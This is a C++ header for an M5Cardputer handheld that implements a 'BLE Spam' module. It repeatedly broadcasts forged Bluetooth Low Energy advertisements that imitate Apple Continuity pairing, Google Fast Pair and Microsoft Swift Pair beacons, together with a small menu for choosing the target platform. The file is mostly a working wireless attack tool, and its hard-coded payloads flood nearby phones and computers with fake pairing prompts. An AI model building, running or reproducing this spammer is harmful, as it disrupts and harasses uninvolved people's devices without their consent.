#pragma once
#include <M5Cardputer.h>
#include <NimBLEDevice.h>
#include "../main_menu.h"

class BleSpamModule {
public:
    enum class Target {
        APPLE = 0,
        ANDROID = 1,
        WINDOWS = 2
    };

    void enter() {
        selected_ = 0;
        running_ = false;
        initBle();
        draw();
    }

    bool update(const NavInput& nav) {
        if (nav.back) {
            stopSpam();
            return true;
        }

        if (nav.up) {
            selected_ = (selected_ - 1 + 3) % 3;
            draw();
        }
        if (nav.down) {
            selected_ = (selected_ + 1) % 3;
            draw();
        }
        if (nav.select) {
            if (running_) {
                stopSpam();
            } else {
                running_ = true;
            }
            draw();
        }

        if (running_) {
            sendSpamStep(static_cast<Target>(selected_));
        }

        return false;
    }

private:
    bool bleInitialized_ = false;
    int selected_ = 0;
    bool running_ = false;
    unsigned long lastAdvMs_ = 0;

    void initBle() {
        if (!bleInitialized_) {
            NimBLEDevice::init("");
            bleInitialized_ = true;
        }
    }

    void stopSpam() {
        running_ = false;
        if (bleInitialized_) {
            NimBLEAdvertising* pAdv = NimBLEDevice::getAdvertising();
            if (pAdv) {
                pAdv->stop();
            }
        }
    }

    void sendSpamStep(Target target) {
        unsigned long now = millis();
        if (now - lastAdvMs_ < 120) {
            return;
        }
        lastAdvMs_ = now;

        NimBLEAdvertising* pAdv = NimBLEDevice::getAdvertising();
        if (!pAdv) return;

        pAdv->stop();
        NimBLEAdvertisementData advData;

        if (target == Target::APPLE) {
            // Continuity / Proximity pair packet (Apple manufacturer ID 0x004C)
            static const uint8_t applePayload[] = {
                0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x02,
                0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45,
                0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
            };
            advData.addData(std::string(reinterpret_cast<const char*>(applePayload), sizeof(applePayload)));
        } else if (target == Target::ANDROID) {
            // Google Fast Pair service UUID 0xFE2C advertisement
            static const uint8_t androidPayload[] = {
                0x03, 0x03, 0x2C, 0xFE,
                0x06, 0x16, 0x2C, 0xFE, 0x92, 0x43, 0x00
            };
            advData.addData(std::string(reinterpret_cast<const char*>(androidPayload), sizeof(androidPayload)));
        } else {
            // Microsoft Swift Pair beacon (0x0006)
            static const uint8_t winPayload[] = {
                0x09, 0xFF, 0x06, 0x00, 0x03, 0x00, 0x80,
                'A', 'D', 'V'
            };
            advData.addData(std::string(reinterpret_cast<const char*>(winPayload), sizeof(winPayload)));
        }

        pAdv->setAdvertisementData(advData);
        pAdv->start();
    }

    void draw() {
        auto& d = M5Cardputer.Display;
        d.fillScreen(THEME_BG);
        d.setTextSize(2);

        const char* targets[3] = { "Apple", "Android", "Windows" };

        d.setTextColor(THEME_FG, THEME_BG);
        d.setCursor(12, 8);
        d.printf("BLE Spam [%s]", running_ ? "ON" : "OFF");

        for (int i = 0; i < 3; ++i) {
            int y = 38 + i * 28;
            bool sel = (i == selected_);

            if (sel) {
                d.fillRoundRect(10, y, d.width() - 20, 25, 4, THEME_HIGHLIGHT);
                d.drawRoundRect(10, y, d.width() - 20, 25, 4, THEME_BORDER);
                d.setTextColor(THEME_FG, THEME_HIGHLIGHT);
            } else {
                d.setTextColor(THEME_FG, THEME_BG);
            }

            d.setCursor(16, y + 5);
            d.print(sel ? "> " : "  ");
            d.print(targets[i]);
        }

        d.setTextSize(1);
        d.setTextColor(THEME_FG, THEME_BG);
        d.setCursor(12, 124);
        d.print("Enter: Start/Stop | `/Bksp: Back");
    }
};
